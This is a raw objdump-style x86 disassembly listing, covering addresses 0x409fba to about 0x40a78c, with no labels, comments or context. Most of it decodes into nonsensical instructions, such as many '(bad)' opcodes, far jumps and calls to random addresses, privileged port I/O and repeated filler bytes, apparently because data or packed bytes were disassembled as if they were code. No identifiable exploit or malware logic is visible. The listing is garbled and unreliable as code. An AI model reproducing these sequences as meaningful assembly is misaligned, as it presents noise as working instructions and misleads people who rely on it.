  409fba:	add    BYTE PTR [eax],al
  409fbc:	push   eax
  409fbd:	ins    DWORD PTR es:[edi],dx
  409fbe:	sub    DWORD PTR [edi-0x3],0x3dc67f08
  409fc5:	pop    eax
  409fc6:	in     al,0x4
  409fc8:	loope  0x409fde
  409fca:	in     eax,0xf5
  409fcc:	xchg   BYTE PTR [ecx],cl
  409fce:	xchg   esp,eax
  409fcf:	sub    DWORD PTR [esi-0x5],ebx
  409fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fd3:	sub    BYTE PTR [ebx],dl
  409fd5:	int3   
  409fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fd7:	mov    ch,dl
  409fd9:	stc    
  409fda:	iret   
  409fdb:	cmp    al,0x32
  409fdd:	test   DWORD PTR [eax+eax*1+0x0],esp
  409fe1:	sbb    eax,0x50
	...
  409fee:	add    BYTE PTR [edx],dl
  409ff0:	test   DWORD PTR [ebx+ecx*4],ebx
  409ff3:	mov    ecx,DWORD PTR [ebx-0x74747475]
  409ff9:	mov    ecx,DWORD PTR [ebx-0x16cfcccd]
  409fff:	pop    esp
  40a000:	and    eax,0x75
  40a003:	and    DWORD PTR [ecx+0x2b4c802c],ebp
  40a009:	out    dx,al
  40a00a:	xchg   ecx,eax
  40a00b:	sti    
  40a00c:	xor    eax,0x44009fd4
  40a011:	jle    0x409fd3
  40a013:	cmp    eax,0x5d3333d4
  40a018:	stos   DWORD PTR es:[edi],eax
  40a019:	iret   
  40a01a:	je     0x409ff1
  40a01c:	cmp    al,0x7a
  40a01e:	push   0xfffffff9
  40a020:	(bad)  [eax+0x39]
  40a023:	sub    BYTE PTR [ecx+0x6c],0xaa
  40a027:	aad    0x5e
  40a029:	adc    BYTE PTR [ebx+0x62],ch
  40a02c:	nop
  40a02d:	test   ah,0x4
  40a030:	jnp    0x40a055
  40a032:	ror    BYTE PTR [ebx+0x33],0x33
  40a036:	sub    ah,BYTE PTR [ebx+eiz*8]
  40a039:	xor    esi,DWORD PTR [ebx]
  40a03b:	sbb    dh,bl
  40a03d:	addr16 xor ebp,eax
  40a040:	inc    ebp
  40a041:	mov    edx,0xebde3586
  40a046:	test   BYTE PTR [esi+edx*4-0x27],bh
  40a04a:	jmp    0x40a041
  40a04c:	leave  
  40a04d:	mov    dh,0x47
  40a04f:	es mov al,0x22
  40a052:	push   cs
  40a053:	adc    BYTE PTR [ecx-0x17da3160],cl
  40a059:	call   0xe8604446
  40a05e:	call   0xe9296a7a
  40a063:	call   0x83c423eb
  40a068:	add    DWORD PTR [ebx-0x3d7c7c7d],0xffffffec
  40a06f:	and    BYTE PTR [eax],al
  40a071:	or     BYTE PTR [ebx-0x6d7dcdea],al
  40a077:	sub    al,0x7e
  40a079:	sahf   
  40a07a:	arpl   WORD PTR [eax-0x7b2d25ea],ax
  40a080:	lods   al,BYTE PTR ds:[esi]
  40a081:	out    dx,eax
  40a082:	jns    0x40a073
  40a084:	rol    BYTE PTR [eax],0x0
  40a087:	add    BYTE PTR [eax],al
  40a089:	add    BYTE PTR [eax],al
  40a08b:	add    BYTE PTR [eax],al
  40a08d:	add    BYTE PTR [ebx+0x661ef48b],cl
  40a093:	fimul  WORD PTR [ebx+0x586c568b]
  40a099:	jle    0x40a0d2
  40a09b:	mov    bh,0xe4
  40a09d:	jno    0x40a0dd
  40a09f:	out    0x96,al
  40a0a1:	sti    
  40a0a2:	repnz mov edi,0x5939cbdd
  40a0a8:	mov    dh,0xca
  40a0aa:	test   dh,dl
  40a0ac:	mov    ds:0x56552531,al
  40a0b1:	adc    al,0x6a
  40a0b3:	stos   DWORD PTR es:[edi],eax
  40a0b4:	pop    ebp
  40a0b5:	fstp   QWORD PTR [ecx-0x3]
  40a0b8:	xor    DWORD PTR [ebx-0x74ecc575],ecx
  40a0be:	mov    esp,DWORD PTR [edx+ecx*1]
  40a0c1:	pop    esp
  40a0c2:	mov    eax,DWORD PTR [ebp+0x50]
  40a0c5:	imul   edi,DWORD PTR [ecx-0x6d],0xda4fe311
  40a0cc:	(bad)  
  40a0cd:	mov    edi,0xd54aefa
  40a0d2:	hlt    
  40a0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0d4:	in     al,dx
  40a0d5:	mov    ebp,0xc41d631a
  40a0da:	in     al,dx
  40a0db:	aas    
  40a0dc:	inc    ebp
  40a0dd:	inc    ebp
  40a0de:	inc    ebp
  40a0df:	outs   dx,DWORD PTR ds:[esi]
  40a0e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0e1:	xchg   BYTE PTR [ebp+0x325c74c6],ch
  40a0e7:	xor    DWORD PTR fs:[esi+0x74],0x70
  40a0ec:	mov    al,0xac
  40a0ee:	iret   
  40a0ef:	loopne 0x40a0cc
  40a0f1:	and    eax,0xa4533838
  40a0f6:	mov    dl,0xf7
  40a0f8:	inc    ebp
  40a0f9:	leave  
  40a0fa:	iret   
  40a0fb:	gs inc ebp
  40a0fd:	inc    ebp
  40a0fe:	mov    al,0xb5
  40a100:	jmp    0xff85e64a
  40a105:	(bad)  
  40a106:	(bad)  
  40a107:	(bad)  
  40a108:	(bad)  
  40a109:	(bad)  
  40a10a:	(bad)  
  40a10b:	(bad)  
  40a10c:	(bad)  
  40a10d:	mov    ebp,0xaa72
  40a112:	add    BYTE PTR [eax],al
  40a114:	add    BYTE PTR [eax],al
  40a116:	add    BYTE PTR [eax],al
  40a118:	add    bh,bh
  40a11a:	call   DWORD PTR [ebx+0x59cd639a]
  40a120:	cwde   
  40a121:	pop    ebx
  40a122:	aad    0xce
  40a124:	mov    eax,0x7a732494
  40a129:	outs   dx,DWORD PTR ds:[esi]
  40a12a:	call   0xa86ab9fd
  40a12f:	jmp    FWORD PTR [ebx+0x4d]
  40a132:	jo     0x40a133
  40a134:	inc    DWORD PTR [edx-0x2e00009d]
  40a13a:	cmp    edi,edi
  40a13c:	(bad)  
  40a13d:	jmp    0x2f32:0xe1c87089
  40a144:	mov    ah,cl
  40a146:	jnp    0x40a0d2
  40a148:	jb     0x40a0ec
  40a14a:	cwde   
  40a14b:	jg     0x40a153
  40a14d:	lods   eax,DWORD PTR ds:[esi]
  40a14e:	mov    ds:0x79440929,al
  40a153:	dec    eax
  40a154:	aam    0xff
  40a156:	add    BYTE PTR [esi],dl
  40a158:	add    DWORD PTR [ebp-0x69],ecx
  40a15b:	add    BYTE PTR [eax],al
  40a15d:	add    cl,ah
  40a15f:	retf   
  40a160:	mov    eax,0xa2837d97
  40a165:	dec    ebp
  40a166:	or     bl,0xe
  40a169:	cmp    al,0xef
  40a16b:	push   ebp
  40a16c:	aam    0x6e
  40a16e:	xor    bh,bh
  40a170:	adc    ch,bl
  40a172:	hlt    
  40a173:	jmp    0x704b:0x4794cb8b
  40a17a:	(bad)  
  40a17b:	cli    
  40a17c:	and    BYTE PTR [ebx-0x68],cl
  40a17f:	or     al,0x62
  40a181:	add    BYTE PTR [eax],al
  40a183:	mov    ah,0x53
	...
  40a191:	outs   dx,DWORD PTR ds:[esi]
  40a192:	jmp    0x0:0x71
  40a199:	add    BYTE PTR [eax],al
  40a19b:	add    BYTE PTR [eax],al
  40a19d:	lea    ecx,[ebp+0x129fc104]
  40a1a3:	loop   0x40a1df
  40a1a5:	sub    BYTE PTR [edx+0x48],cl
  40a1a8:	lods   eax,DWORD PTR ds:[esi]
  40a1a9:	xchg   ebx,eax
  40a1aa:	jle    0x40a182
  40a1ac:	pop    esp
  40a1ad:	out    dx,al
  40a1ae:	cmp    DWORD PTR [esi+0x70],ebp
  40a1b1:	jge    0x40a13d
  40a1b3:	js     0x40a1d2
  40a1b5:	leave  
  40a1b6:	in     eax,0x8d
  40a1b8:	lea    edi,[ebx-0x37]
  40a1bb:	sbb    BYTE PTR [edi-0x65],dh
  40a1be:	sahf   
  40a1bf:	arpl   WORD PTR [edx+0x357b3306],cx
  40a1c5:	push   edx
  40a1c6:	out    0xb1,eax
  40a1c8:	xor    bl,BYTE PTR [ebx-0x39]
  40a1cb:	fsubr  DWORD PTR [eax-0x2a1191f5]
  40a1d1:	test   BYTE PTR [eax*8-0x7272a020],al
  40a1d8:	xor    BYTE PTR [eax+0x758d8d3c],ah
  40a1de:	pop    ecx
  40a1df:	pusha  
  40a1e0:	lea    ecx,[ebx-0x36aa8dfb]
  40a1e6:	pop    esi
  40a1e7:	rcr    BYTE PTR [edi+0x75],cl
  40a1ea:	mov    esp,0x8f7fa753
  40a1ef:	popf   
  40a1f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1f1:	fnstenv [esi]
  40a1f3:	adc    cl,BYTE PTR [eax]
  40a1f5:	out    dx,eax
  40a1f6:	push   ds
  40a1f7:	mov    eax,eax
  40a1f9:	dec    ecx
  40a1fa:	mov    ecx,DWORD PTR [ebx-0x742bba75]
  40a200:	mov    esp,DWORD PTR [esi]
  40a202:	xchg   ebx,eax
  40a203:	mov    ecx,DWORD PTR [ebx+0x8b]
  40a209:	add    BYTE PTR [eax],al
  40a20b:	add    BYTE PTR [eax],al
  40a20d:	add    BYTE PTR [eax],al
  40a20f:	ds inc edx
  40a211:	adc    dh,BYTE PTR [edi+0x36af431a]
  40a217:	icebp  
  40a218:	dec    ebp
  40a219:	cmp    BYTE PTR [esi],dl
  40a21b:	jmp    0x4cf5:0xf091b193
  40a222:	mov    esp,0xd0558e75
	...
  40a22f:	add    BYTE PTR [eax+0x50],dl
  40a232:	imul   edi,DWORD PTR [ebp+0x36],0xffffff8e
  40a236:	push   eax
  40a237:	push   eax
  40a238:	(bad)  
  40a239:	mov    esi,0x91d6d83a
  40a23e:	(bad)  
  40a23f:	mov    bl,0x65
  40a241:	or     DWORD PTR [ebx+0x49],eax
  40a244:	push   cs
  40a245:	enter  0x6f2e,0x41
  40a249:	jb     0x40a2ac
  40a24b:	and    ah,BYTE PTR gs:[esi+0x65]
  40a24f:	arpl   WORD PTR [ebx+0x20],sp
  40a252:	and    ch,BYTE PTR [ecx+0x6d]
  40a255:	bound  edx,QWORD PTR [esi+0x74]
  40a258:	outs   dx,DWORD PTR ds:[esi]
  40a259:	push   ebx
  40a25a:	outs   dx,BYTE PTR ds:[esi]
  40a25b:	and    BYTE PTR [eax+0x61],ch
  40a25e:	gs ins DWORD PTR es:[edi],dx
  40a260:	jbe    0x40a2c8
  40a262:	arpl   WORD PTR [esi],di
  40a264:	popa   
  40a265:	ins    DWORD PTR es:[edi],dx
  40a266:	imul   esp,DWORD PTR [ebp+0x6f],0x6e53653a
  40a26d:	bound  esi,QWORD PTR [ebx+0x4d]
  40a270:	or     eax,0x655b5469
  40a275:	outs   dx,DWORD PTR ds:[esi]
  40a276:	dec    ebp
  40a277:	je     0x40a299
  40a279:	gs ins DWORD PTR es:[edi],dx
  40a27b:	ins    DWORD PTR es:[edi],dx
  40a27c:	push   ebx
  40a27d:	imul   esp,DWORD PTR [eax],0x69696969
  40a283:	gs inc ebx
  40a285:	ins    DWORD PTR es:[edi],dx
  40a286:	jae    0x40a2fe
  40a288:	jb     0x40a2ac
  40a28a:	jb     0x40a2ef
  40a28c:	and    BYTE PTR [esi+0x6e],dh
  40a28f:	je     0x40a2fe
  40a291:	and    BYTE PTR [esi],ch
  40a293:	bound  edi,QWORD PTR gs:[edx]
  40a296:	ja     0x40a2fb
  40a298:	imul   ebp,DWORD PTR [ecx+0x65],0x4165206d
  40a29f:	arpl   WORD PTR [edi+0x50],bp
  40a2a2:	and    BYTE PTR gs:[eax],ah
  40a2a5:	imul   ebp,DWORD PTR ds:[ecx+0x20],0x66
  40a2aa:	gs je  0x40a31c
  40a2ad:	imul   esp,DWORD PTR [ebp+0x74],0x652f6d72
  40a2b4:	inc    ebx
  40a2b5:	or     ah,BYTE PTR [ecx-0x26]
  40a2b8:	mov    ch,ch
  40a2ba:	data16 hlt 
  40a2bc:	call   0xc8d9:0xec9f00c1
  40a2c3:	leave  
  40a2c4:	xchg   BYTE PTR [eax-0x75],bl
  40a2c7:	jecxz  0x40a2ac
  40a2c9:	mov    ah,0x81
  40a2cb:	dec    ecx
  40a2cc:	push   eax
  40a2cd:	push   eax
  40a2ce:	mov    eax,ds:0xe2505033
  40a2d3:	jne    0x40a2b3
  40a2d5:	push   eax
  40a2d6:	test   DWORD PTR [ebx-0x13],esi
  40a2d9:	jmp    0x9fd3:0x102e7b4f
  40a2e0:	add    BYTE PTR [ebx+0x7a35af6e],0x6a
  40a2e7:	cmp    DWORD PTR [edi+0x490aa670],ebp
  40a2ed:	loope  0x40a293
  40a2ef:	test   DWORD PTR [ebp+0x397c8185],eax
  40a2f5:	xchg   edx,eax
  40a2f6:	ret    0x8b2f
  40a2f9:	lock jmp DWORD PTR [esi+edi*1-0x72]
  40a2fe:	xor    dh,dl
  40a300:	hlt    
  40a301:	dec    ebp
  40a302:	xchg   ebx,eax
  40a303:	push   eax
  40a304:	in     al,0x10
  40a306:	lds    edx,FWORD PTR [edx-0x4ae9ad8b]
  40a30c:	jae    0x40a2a3
  40a30e:	dec    edi
  40a30f:	test   DWORD PTR [ebp-0x7ac97931],eax
  40a315:	test   DWORD PTR [ebp-0x74747475],eax
  40a31b:	mov    ecx,DWORD PTR [ebx+0x778b8b8b]
  40a321:	test   ebp,esi
  40a323:	(bad)  
  40a324:	(bad)  
  40a325:	(bad)  
  40a326:	(bad)  
  40a327:	(bad)  
  40a328:	(bad)  
  40a329:	(bad)  
  40a32a:	(bad)  
  40a32b:	sldt   WORD PTR [eax]
  40a32e:	lahf   
  40a32f:	mov    bh,0x2d
  40a331:	lods   eax,DWORD PTR ds:[esi]
  40a332:	sbb    DWORD PTR [edi+ecx*1],0xffffff9b
  40a336:	popa   
  40a337:	adc    al,0xa9
  40a339:	jp     0x40a2d0
  40a33b:	mov    ch,0x13
  40a33d:	push   ds
  40a33e:	jp     0x40a3b9
  40a340:	add    DWORD PTR [ecx],edx
  40a342:	sub    BYTE PTR [edx+0x9e23],ch
  40a348:	adc    al,0x97
  40a34a:	add    BYTE PTR [eax],al
  40a34c:	jnp    0x40a342
  40a34e:	add    BYTE PTR [eax],al
  40a350:	pop    ecx
  40a351:	pop    edi
  40a352:	or     edi,DWORD PTR [esi+ebp*8]
  40a355:	cld    
  40a356:	pop    ebp
  40a357:	iret   
  40a358:	int    0x42
  40a35a:	cs (bad) 
  40a35c:	rcl    BYTE PTR [esi+ecx*8],1
  40a35f:	mov    DWORD PTR [ebx+edx*8+0x72bd80be],ebp
  40a366:	xchg   ecx,eax
  40a367:	aaa    
  40a368:	add    BYTE PTR [ebp-0x54f2f71a],cl
  40a36e:	lea    ecx,[ebp+0x6a941f8d]
  40a374:	sbb    esi,DWORD PTR [ecx+edx*1]
  40a377:	pop    es
  40a378:	nop
  40a379:	fidivr WORD PTR [ebx-0x1c904b49]
  40a37f:	push   edi
  40a380:	mov    ebp,0xc6ee7680
  40a385:	jp     0x40a372
  40a387:	imul   bl
  40a389:	int3   
  40a38a:	(bad)  
  40a38b:	out    0xf3,al
  40a38d:	out    0x5a,eax
  40a38f:	and    BYTE PTR [ecx-0x72749a69],al
  40a395:	lea    ebp,[edx]
  40a397:	add    cl,BYTE PTR [ebp+0x8d8d]
  40a39d:	add    BYTE PTR [eax],al
  40a39f:	add    BYTE PTR [eax],al
  40a3a1:	add    BYTE PTR [eax],al
  40a3a3:	add    ah,dh
  40a3a5:	adc    edx,edx
  40a3a7:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40a3ad:	mov    ecx,DWORD PTR [ebx-0x16ffff75]
  40a3b3:	imul   esi,eax,0xea88c3d0
  40a3b9:	push   ebp
  40a3ba:	add    dl,BYTE PTR [eax-0xc]
  40a3bd:	mov    esp,0xea0f6ebf
  40a3c2:	aad    0x6e
  40a3c4:	jg     0x40a3e7
  40a3c6:	xchg   edi,eax
  40a3c7:	and    eax,0x7c6e
  40a3cc:	xchg   ecx,eax
  40a3cd:	neg    edx
  40a3cf:	test   BYTE PTR [ecx+0x21ace4ec],bl
  40a3d5:	ins    WORD PTR es:[edi],dx
  40a3d7:	(bad)  [ecx+eiz*8]
  40a3da:	scas   eax,DWORD PTR es:[edi]
  40a3db:	inc    edx
  40a3dc:	ja     0x40a425
  40a3de:	jp     0x40a40b
  40a3e0:	shl    BYTE PTR [eax],0x64
  40a3e3:	fild   WORD PTR [eax+0x67]
  40a3e6:	mov    ebp,DWORD PTR ds:0xaf0000a7
  40a3ec:	push   cs
  40a3ed:	dec    edx
  40a3ee:	add    BYTE PTR [eax],al
  40a3f0:	inc    edx
  40a3f1:	nop
  40a3f2:	xchg   esp,eax
  40a3f3:	add    BYTE PTR [eax],al
  40a3f5:	arpl   WORD PTR [ecx+ebx*8+0x69a054ea],bp
  40a3fc:	sub    al,0x95
  40a3fe:	retf   
  40a3ff:	leave  
  40a400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a401:	ins    BYTE PTR es:[edi],dx
  40a402:	xor    DWORD PTR [edx+ebp*8],0x43
  40a406:	adc    BYTE PTR [eax+0x29187ef1],0xa8
  40a40d:	add    BYTE PTR [eax],al
  40a40f:	add    BYTE PTR [ebx-0x41ffffb6],ah
  40a415:	add    eax,DWORD PTR [eax]
  40a417:	add    BYTE PTR [eax],al
  40a419:	add    al,0x4
  40a41b:	add    al,0x4
  40a41d:	add    al,0x4
  40a41f:	add    al,0x4
  40a421:	add    al,0xb2
  40a423:	xlat   BYTE PTR ds:[ebx]
  40a424:	sbb    al,0xd3
  40a426:	retf   
  40a427:	stos   BYTE PTR es:[edi],al
  40a428:	jl     0x40a452
  40a42a:	fwait
  40a42b:	dec    ecx
  40a42c:	pop    es
  40a42d:	inc    eax
  40a42e:	mov    ah,bl
  40a430:	sbb    ah,BYTE PTR [ebp-0x1f5b5d34]
  40a436:	addr16 jg 0x40a461
  40a439:	jnp    0x8bcc2fca
  40a43f:	mov    ecx,DWORD PTR [ebx+0x8b8b]
  40a445:	xor    eax,0xc0f689
  40a44a:	add    BYTE PTR [esi+0x11d7f840],dh
  40a450:	cdq    
  40a451:	xor    eax,0x394ab18a
  40a456:	repnz xchg edi,eax
  40a458:	(bad)  
  40a459:	retf   
  40a45a:	mov    eax,ds:0x7b850c68
  40a45f:	mov    dh,0x24
  40a461:	rcl    BYTE PTR [ebx-0x20],0x4c
  40a465:	xchg   ebp,eax
  40a466:	mov    bl,0x4b
  40a468:	jnp    0x40a4df
  40a46a:	pusha  
  40a46b:	mov    edi,DWORD PTR [edx]
  40a46d:	test   BYTE PTR [eax],0x0
  40a470:	btr    DWORD PTR [eax],eax
  40a473:	add    BYTE PTR [ebx+0xc52b],dl
  40a479:	mov    dl,0x47
  40a47b:	cld    
  40a47c:	popa   
  40a47d:	rol    DWORD PTR [eax],0xbe
  40a480:	leave  
  40a481:	cmc    
  40a482:	inc    ebp
  40a483:	mov    BYTE PTR [ecx+0x2e77668f],cl
  40a489:	mov    edx,0x69b6e4ca
  40a48e:	icebp  
  40a48f:	test   al,0xa1
  40a491:	add    BYTE PTR [eax],al
  40a493:	add    dh,bl
  40a495:	xor    DWORD PTR [ebp+0x1323a0cc],edx
  40a49b:	lds    ebp,FWORD PTR [ebx-0x56ba295f]
  40a4a1:	jmp    0xc0007598
  40a4a6:	aam    0xa7
  40a4a8:	js     0x40a4cf
  40a4aa:	mov    bh,0x1c
  40a4ac:	out    dx,al
  40a4ad:	mov    cl,0x40
  40a4af:	adc    al,0xb4
  40a4b1:	add    BYTE PTR [eax],al
  40a4b3:	(bad)  
  40a4b4:	mov    eax,0xbb
	...
  40a4c1:	add    BYTE PTR [edi-0x42],al
  40a4c4:	out    dx,eax
  40a4c5:	call   0xe9298db2
  40a4ca:	call   0x298db7
  40a4cf:	jmp    ebx
  40a4d1:	push   ss
  40a4d2:	stos   DWORD PTR es:[edi],eax
  40a4d3:	fisub  WORD PTR [eax-0x3faed4cd]
  40a4d9:	and    eax,0x576aa7d2
  40a4de:	push   eax
  40a4df:	aam    0xb5
  40a4e1:	mov    cl,0x1d
  40a4e3:	ficom  DWORD PTR [esi-0x5b9f1]
  40a4e9:	push   DWORD PTR [ebp+0x6]
  40a4ec:	(bad)  
  40a4ed:	push   ebx
  40a4ef:	mov    ecx,0x3d8affff
  40a4f4:	pop    edx
  40a4f5:	lahf   
  40a4f6:	repz sbb al,0x89
  40a4f9:	inc    eax
  40a4fa:	adc    edi,DWORD PTR [ebx-0x6fdcc1d3]
  40a500:	sahf   
  40a501:	test   BYTE PTR ds:0xa16b776e,ah
  40a507:	sub    BYTE PTR [edi],bl
  40a509:	in     eax,0xff
  40a50b:	lea    esi,[eax-0x7296d553]
  40a511:	lea    ecx,[ebp-0x6b9ef1aa]
  40a517:	mov    esi,0x5619cfe2
  40a51c:	add    eax,0x53a0bbf2
  40a521:	pop    edx
  40a522:	enter  0x28d7,0x19
  40a526:	and    DWORD PTR [ebx],esp
  40a528:	fmul   QWORD PTR [ecx+0x7b]
  40a52b:	add    eax,0xe077775d
  40a530:	sbb    al,0x5c
  40a532:	pop    ebp
  40a533:	ss jno 0x40a596
  40a536:	lea    ecx,[ebp-0x727244fa]
  40a53c:	lea    ecx,[ecx-0x76767677]
  40a542:	mov    DWORD PTR [ecx+0x611a8989],ecx
  40a548:	cwde   
  40a549:	or     al,0xc
  40a54b:	or     al,0xc
  40a54d:	or     al,0xc
  40a54f:	or     al,0xc
  40a551:	or     al,0x0
  40a553:	add    BYTE PTR [esi-0x4d],dh
  40a556:	ja     0x40a50d
  40a558:	jecxz  0x40a588
  40a55a:	jb     0x40a5ad
  40a55c:	pop    es
  40a55d:	xchg   BYTE PTR [ebx-0x35],bl
  40a560:	bound  ebx,QWORD PTR [edx+0x71d7aa1a]
  40a566:	fwait
  40a567:	xchg   edx,eax
  40a568:	sbb    esp,0x31da
  40a56e:	int    0x4a
  40a570:	add    cl,dh
  40a572:	mov    eax,0xe9b12c6d
  40a577:	mov    DWORD PTR [edi-0x18],ebx
  40a57a:	inc    ebx
  40a57b:	scas   al,BYTE PTR es:[edi]
  40a57c:	pushf  
  40a57d:	mov    bl,0xcb
  40a57f:	rcr    cl,cl
  40a581:	cld    
  40a582:	push   eax
  40a583:	call   0xca7e4a10
  40a588:	fstp   TBYTE PTR [eax-0x19ffffdd]
  40a58e:	mov    ds:0x70000097,al
  40a593:	add    BYTE PTR [eax+0x646a8b00],dl
  40a599:	xor    eax,0x36eace33
  40a59e:	mov    eax,0xb5fc8d98
  40a5a3:	xchg   edi,eax
  40a5a4:	or     eax,0xe9ea55b3
  40a5a9:	addr16 (bad) 
  40a5ab:	in     al,dx
  40a5ac:	faddp  st(5),st
  40a5ae:	cdq    
  40a5af:	mov    ecx,DWORD PTR [ebx-0x74639275]
  40a5b5:	mov    eax,DWORD PTR [edi]
  40a5b7:	js     0x40a544
  40a5b9:	mov    ecx,DWORD PTR [ebx+0xc0c0c0c]
  40a5bf:	or     al,0xc
  40a5c1:	or     al,0xc
  40a5c3:	or     al,0x89
  40a5c5:	out    0xd3,eax
  40a5c7:	ss nop
  40a5c9:	int3   
  40a5ca:	mov    BYTE PTR [esi+eax*8+0x46],al
  40a5ce:	sbb    esp,DWORD PTR [edx+0x33]
  40a5d1:	clc    
  40a5d2:	mov    dl,0x2e
  40a5d4:	and    DWORD PTR [edx],0x34d1f235
  40a5da:	inc    ecx
  40a5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  40a5e4:	add    BYTE PTR [ebx+0x458e378b],cl
  40a5ea:	xchg   edi,eax
  40a5eb:	mov    ecx,DWORD PTR [ebx+0x6b4a33]
  40a5f1:	jecxz  0x40a5d3
  40a5f3:	mov    ebx,0xbc54d292
  40a5f8:	das    
  40a5f9:	adc    eax,0x2c657265
  40a5fe:	and    BYTE PTR [ebp+0x73],ah
  40a601:	je     0x40a668
  40a603:	or     eax,0x41626d20
  40a608:	ins    DWORD PTR es:[edi],dx
  40a609:	or     ch,BYTE PTR [esi+0x65]
  40a60c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x63]
  40a610:	bound  edx,QWORD PTR [edi+0x6f]
  40a613:	cmp    al,0x6d
  40a615:	ins    DWORD PTR es:[edi],dx
  40a616:	je     0x40a681
  40a618:	cs cmp eax,0x722e2e41
  40a61e:	bound  esp,QWORD PTR [eax]
  40a620:	dec    ebp
  40a621:	gs jbe 0x40a689
  40a624:	jae    0x40a693
  40a626:	outs   dx,DWORD PTR ds:[esi]
  40a627:	jns    0x40a67c
  40a629:	and    BYTE PTR [ebp+0x69],ch
  40a62c:	and    ah,BYTE PTR gs:[ebp+0x65]
  40a630:	jo     0x40a69f
  40a632:	push   eax
  40a633:	ins    DWORD PTR es:[edi],dx
  40a634:	jb     0x40a6a3
  40a636:	push   edi
  40a637:	arpl   WORD PTR [edi+0x73],si
  40a63a:	ins    DWORD PTR es:[edi],dx
  40a63b:	outs   dx,BYTE PTR ds:[esi]
  40a63c:	arpl   WORD PTR [eax],sp
  40a63e:	gs ins DWORD PTR es:[edi],dx
  40a640:	push   ebx
  40a641:	gs gs fs jae 0x40a6b1
  40a646:	mov    ds:0x5941552a,eax
  40a64b:	xchg   ecx,eax
  40a64c:	and    dh,al
  40a64e:	and    al,0xda
  40a650:	jae    0x40a5fe
  40a652:	popa   
  40a653:	add    bl,BYTE PTR [eax-0x2b]
  40a656:	jns    0x40a60d
  40a658:	inc    edx
  40a659:	mov    ch,0x27
  40a65b:	mov    ecx,DWORD PTR [ebx-0x7474e26b]
  40a661:	test   DWORD PTR [esi],ebp
  40a663:	mov    ds:0xd18ff8b,al
  40a668:	out    0xec,eax
  40a66a:	aad    0x1f
  40a66c:	xor    DWORD PTR [esi-0x2cfc0791],edi
  40a672:	ins    BYTE PTR es:[edi],dx
  40a673:	push   0x4d
  40a675:	mov    esp,0x28f74e2f
  40a67a:	imul   DWORD PTR [edx+0x60]
  40a67d:	pop    esp
  40a67e:	(bad)  
  40a67f:	(bad)  
  40a680:	(bad)  
  40a681:	fisubr DWORD PTR [ebx-0x2d3f1c3f]
  40a687:	inc    ecx
  40a688:	inc    ebp
  40a689:	ja     0x40a673
  40a68b:	rol    ecx,cl
  40a68d:	sbb    ah,BYTE PTR [edi]
  40a68f:	inc    edx
  40a690:	shr    esp,cl
  40a692:	jbe    0x40a6e3
  40a694:	repnz xchg esp,eax
  40a696:	dec    ebx
  40a697:	(bad)  
  40a698:	test   dh,al
  40a69a:	gs push cs
  40a69c:	xchg   edx,eax
  40a69d:	cmp    eax,0xaf40ffff
  40a6a2:	jmp    0xffff:0xffffffff
  40a6a9:	(bad)  
  40a6aa:	(bad)  
  40a6ab:	(bad)  
  40a6ac:	(bad)  
  40a6ad:	(bad)  
  40a6ae:	push   DWORD PTR [ebx-0x64]
  40a6b1:	dec    edi
	...
  40a6ba:	add    BYTE PTR [eax],al
  40a6bc:	add    BYTE PTR [edi+0x54],al
  40a6bf:	(bad)  [edx+0x6719ad55]
  40a6c5:	test   dl,bh
  40a6c7:	imul   ebx,DWORD PTR [esi-0x5437f9aa],0x143e71f3
  40a6d1:	jge    0x40a6ae
  40a6d3:	push   cs
  40a6d4:	cmp    al,0x0
  40a6d6:	add    BYTE PTR [eax+0x21000087],cl
  40a6dc:	bound  eax,QWORD PTR [eax]
  40a6de:	add    al,cl
  40a6e0:	sub    eax,0x1ea9c42a
  40a6e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6e6:	mov    ch,0x12
  40a6e8:	out    dx,al
  40a6e9:	xchg   edi,eax
  40a6ea:	xor    eax,0xf8a4358a
  40a6ef:	mov    eax,ds:0x5264cb27
  40a6f4:	sbb    eax,0xc6a4
  40a6f9:	xchg   ebp,esi
  40a6fb:	jmp    0x5ab1:0x31
  40a702:	xchg   ebx,eax
  40a703:	outs   dx,DWORD PTR ds:[esi]
  40a704:	das    
  40a705:	mov    ch,0xcc
  40a707:	adc    al,BYTE PTR [edx+eax*8-0x74304ca4]
  40a70e:	daa    
  40a70f:	xchg   edx,eax
  40a710:	test   al,0xd
  40a712:	add    esp,DWORD PTR [ebp-0x5c3c8b1]
  40a718:	xlat   BYTE PTR ds:[ebx]
  40a719:	enter  0x1d89,0xd2
  40a71d:	pop    esi
  40a71e:	stos   BYTE PTR es:[edi],al
  40a71f:	jge    0x40a702
  40a721:	leave  
  40a722:	add    BYTE PTR ds:[eax],al
  40a725:	mov    ah,0xca
	...
  40a733:	dec    esp
  40a734:	aaa    
  40a735:	shl    BYTE PTR [ebp+0x75],0x75
  40a739:	jne    0x40a7b0
  40a73b:	jne    0x40a7b2
  40a73d:	jne    0x40a7b4
  40a73f:	(bad)  
  40a740:	jmp    FWORD PTR [ebp+0x573883af]
  40a746:	dec    eax
  40a747:	push   eax
  40a748:	les    edi,FWORD PTR [ecx+0x5e]
  40a74b:	ins    DWORD PTR es:[edi],dx
  40a74c:	mov    ebx,0xed488272
  40a751:	les    edi,FWORD PTR ds:0x49ad441d
  40a757:	pop    ebx
  40a758:	adc    bh,bh
  40a75a:	dec    edi
  40a75c:	and    eax,0x53bb9ae7
  40a761:	sbb    DWORD PTR [edi-0x2],ebx
  40a764:	mov    cl,BYTE PTR [edi]
  40a766:	or     eax,0x908c8525
  40a76b:	adc    DWORD PTR [ebx+0x72],0xffffffeb
  40a76f:	cmp    BYTE PTR [edx+0x3454933f],ah
  40a775:	imul   esp,eax,0x38
  40a778:	(bad)  
  40a779:	push   DWORD PTR [ebx+0x7a]
  40a77c:	mov    bh,bh
  40a77e:	jmp    FWORD PTR [eax*8+0x458bffa3]
  40a785:	mov    ecx,0x5250c7b1
  40a78a:	in     eax,dx
  40a78b:	xchg   ebp,eax
  40a78c:	and    bh,BYTE PTR [ebx]
